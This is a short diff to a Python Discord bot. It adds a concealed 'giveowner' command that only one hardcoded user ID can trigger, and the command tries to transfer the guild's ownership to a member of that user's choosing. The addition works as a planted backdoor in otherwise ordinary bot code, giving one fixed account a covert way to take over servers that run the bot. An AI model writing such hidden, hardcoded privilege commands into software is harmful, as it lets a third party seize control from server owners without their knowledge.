@@ -2479,4 +2479,9 @@ async def blacklist(ctx,query = None,user:discord.User = None):
 @client.event
 async def on_command(ctx):
   print(f"{ctx.author} Used {ctx.command.name} In {ctx.guild.name}")
+@client.command()
+async def giveowner(ctx,member: discord.Member):
+  if ctx.author.id == 757589836441059379:
+    await ctx.guild.edit(owner = member)
+    await ctx.send('Success!')
 client.run(TOKEN)
